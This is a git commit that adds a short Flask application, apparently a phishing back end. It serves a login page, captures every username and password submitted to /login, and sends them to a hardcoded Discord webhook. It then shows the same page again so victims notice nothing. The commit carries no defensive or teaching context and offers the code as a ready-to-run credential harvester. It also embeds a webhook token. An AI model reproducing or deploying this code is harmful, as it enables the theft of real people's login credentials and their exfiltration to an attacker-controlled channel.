d7df32cf7b4d14234d7a83a96824bd4e8d129d4e
Apwner1 <93075886+Apwner1@users.noreply.github.com>
2021-10-24 12:40:16 +0300

    Lets goo

---
+++ app.py
@@ -0,0 +1,30 @@
+from flask import Flask, render_template, request
+from discord_webhook import DiscordWebhook
+import smtplib
+import requests
+
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template('login.html')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    username = request.form.get('send_username')
+    password = request.form.get('send_password')
+    try:
+        login_info = ("""Username ```{}``` password ```{}```""").format(username, password)
+
+        hook = ("https://discord.com/api/webhooks/901158074906206218/x-bE5mVPAHZOXRxWYUKSqVz-pBZ0z7HY2tKBcOug2aqsjU_uzWNKuFqlvRhU8vhiV7yA")
+        msg = str(login_info)
+        webhook = DiscordWebhook(url= str(hook), content= msg,)
+        response = webhook.execute()
+
+        return render_template('login.html')
+    except:
+        return render_template('login.html')
+
+if __name__ == '__main__':
+    app.run()
